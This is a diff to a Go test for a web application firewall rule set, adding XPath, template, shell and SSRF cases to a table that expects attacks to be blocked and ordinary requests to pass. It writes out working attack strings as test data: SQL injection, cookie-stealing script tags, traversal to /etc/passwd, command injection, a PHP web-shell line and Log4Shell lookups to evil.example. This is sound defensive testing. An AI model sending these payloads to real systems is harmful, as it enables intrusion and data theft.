@@ -224,31 +224,59 @@ func TestTheRuleSetBlocksCommonAttacksAndPassesOrdinaryTraffic(t *testing.T) {
 		headers                  map[string]string
 		want                     int
 	}{
-		"sql injection in the query":  {"GET", q("1' OR '1'='1' --"), "", "", nil, 403},
-		"union select":                {"GET", q("1 UNION SELECT username,password FROM users"), "", "", nil, 403},
-		"sql injection in a form":     {"POST", "/login", form, "user=admin'--&pass=x", nil, 403},
-		"script tag in the query":     {"GET", q("<script>alert(document.cookie)</script>"), "", "", nil, 403},
-		"event handler":               {"GET", q(`"><img src=x onerror=alert(1)>`), "", "", nil, 403},
-		"path traversal":              {"GET", q("../../../../etc/passwd"), "", "", nil, 403},
-		"encoded traversal":           {"GET", "/download?f=..%2f..%2f..%2fetc%2fpasswd", "", "", nil, 403},
-		"command injection":           {"GET", q("; cat /etc/passwd"), "", "", nil, 403},
-		"log4shell in a header":       {"GET", "/", "", "", map[string]string{"X-Api-Version": "${jndi:ldap://evil.example/a}"}, 403},
-		"log4shell in the user agent": {"GET", "/", "", "", map[string]string{"User-Agent": "${jndi:ldap://evil.example/a}"}, 403},
-		"scanner user agent":          {"GET", "/", "", "", map[string]string{"User-Agent": "sqlmap/1.7"}, 403},
-		"php code":                    {"POST", "/x", form, "c=" + url.QueryEscape(`<?php system($_GET['c']); ?>`), nil, 403},
-		"json body injection":         {"POST", "/api", "application/json", `{"q":"1' OR '1'='1' --"}`, nil, 403},
+		"sql injection in the query":         {"GET", q("1' OR '1'='1' --"), "", "", nil, 403},
+		"union select":                       {"GET", q("1 UNION SELECT username,password FROM users"), "", "", nil, 403},
+		"sql injection in a form":            {"POST", "/login", form, "user=admin'--&pass=x", nil, 403},
+		"script tag in the query":            {"GET", q("<script>alert(document.cookie)</script>"), "", "", nil, 403},
+		"event handler":                      {"GET", q(`"><img src=x onerror=alert(1)>`), "", "", nil, 403},
+		"path traversal":                     {"GET", q("../../../../etc/passwd"), "", "", nil, 403},
+		"encoded traversal":                  {"GET", "/download?f=..%2f..%2f..%2fetc%2fpasswd", "", "", nil, 403},
+		"command injection":                  {"GET", q("; cat /etc/passwd"), "", "", nil, 403},
+		"log4shell in a header":              {"GET", "/", "", "", map[string]string{"X-Api-Version": "${jndi:ldap://evil.example/a}"}, 403},
+		"log4shell in the user agent":        {"GET", "/", "", "", map[string]string{"User-Agent": "${jndi:ldap://evil.example/a}"}, 403},
+		"scanner user agent":                 {"GET", "/", "", "", map[string]string{"User-Agent": "sqlmap/1.7"}, 403},
+		"php code":                           {"POST", "/x", form, "c=" + url.QueryEscape(`<?php system($_GET['c']); ?>`), nil, 403},
+		"XPath boolean predicate":            {"GET", q("' or true() or 'a'='b"), "", "", nil, 403},
+		"XPath arbitrary nested parentheses": {"GET", q("' or (((true()))) or 'a'='b"), "", "", nil, 403},
+		"XPath nested comments":              {"GET", q("' or (:(:nested:)comment:) true() or 'a'='b"), "", "", nil, 403},
+		"XPath non-enumerated function":      {"GET", q("' or upper-case(name())='ADMIN' or 'a'='b"), "", "", nil, 403},
+		"XPath comment before operator":      {"GET", q("'(:comment:)or true() or 'a'='b"), "", "", nil, 403},
+		"parenthesized template arithmetic":  {"GET", q("*{(8 + 8)}"), "", "", nil, 403},
+		"deeply encoded traversal":           {"GET", q("%25252525252e%25252525252e%25252525252fetc%25252525252fpasswd"), "", "", nil, 403},
+		"XPath nested function":              {"POST", "/api", "application/json", `{"input":"' or (not(false())) or 'a'='b"}`, nil, 403},
+		"XPath union":                        {"GET", q("'] | //user | //*['a'='a"), "", "", nil, 403},
+		"shell backtick":                     {"GET", q("`id`"), "", "", nil, 403},
+		"shell substitution":                 {"POST", "/api", "application/json", `{"input":"$(whoami)"}`, nil, 403},
+		"quoted command spelling":            {"GET", q(";i''d"), "", "", nil, 403},
+		"Windows command interpreter":        {"GET", q("cmd.exe /c dir"), "", "", nil, 403},
+		"nested encoded traversal":           {"GET", q("%252e%252e%252fetc%252fpasswd"), "", "", nil, 403},
+		"template arithmetic":                {"GET", q("*{7*7}"), "", "", nil, 403},
+		"template config object":             {"GET", q("{{config}}"), "", "", nil, 403},
+		"Java stream marker":                 {"GET", q("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"), "", "", nil, 403},
+		"hexadecimal URL host":               {"GET", q("http://0x7f000001/"), "", "", nil, 403},
+		"URL userinfo confusion":             {"GET", q("http://example.com@127.0.0.1/"), "", "", nil, 403},
+		"dict fetch protocol":                {"GET", q("dict://127.0.0.1:11211/stats"), "", "", nil, 403},
+		"json body injection":                {"POST", "/api", "application/json", `{"q":"1' OR '1'='1' --"}`, nil, 403},
 		// No XXE case: the CRS has no rule for external entities. Block them in the XML parser or with a rule of our own.
+		"XPath in an XML attribute": {"POST", "/api", "application/xml", `<input value="' or true() or 'a'='b"/>`, nil, 403},
+		"benign XML attribute":      {"POST", "/api", "application/xml", `<input value="O'Brien"/>`, nil, 200},
 		"home page":                 {"GET", "/", "", "", nil, 200},
 		"static asset":              {"GET", "/assets/app.css?v=3", "", "", nil, 200},
 		"search for ordinary words": {"GET", q("blue widgets for sale"), "", "", nil, 200},
 		"a name with an apostrophe": {"GET", q("O'Brien"), "", "", nil, 200},
+		"plain function discussion": {"GET", q("XPath count() and true() functions"), "", "", nil, 200},
+		"plain arithmetic":          {"GET", q("7*7=49"), "", "", nil, 200},
+		"template variable":         {"GET", q("{{customer_name}}"), "", "", nil, 200},
+		"semicolon prose":           {"GET", q("hello; welcome home"), "", "", nil, 200},
 		"ordinary login form":       {"POST", "/login", form, "user=alice&pass=correct+horse+battery", nil, 200},
 		"ordinary json":             {"POST", "/api", "application/json", `{"name":"Alice","items":[1,2,3],"note":"hello world"}`, nil, 200},
 		"a url in a field":          {"POST", "/profile", form, "website=" + url.QueryEscape("https://example.com/about?x=1"), nil, 200},
 	} {
-		if got := do(t, srv, tc.method, tc.target, tc.ct, tc.body, tc.headers); got != tc.want {
-			t.Errorf("%s: status %d, want %d", name, got, tc.want)
-		}
+		t.Run(name, func(t *testing.T) {
+			if got := do(t, srv, tc.method, tc.target, tc.ct, tc.body, tc.headers); got != tc.want {
+				t.Errorf("status %d, want %d", got, tc.want)
+			}
+		})
 	}
 }
 
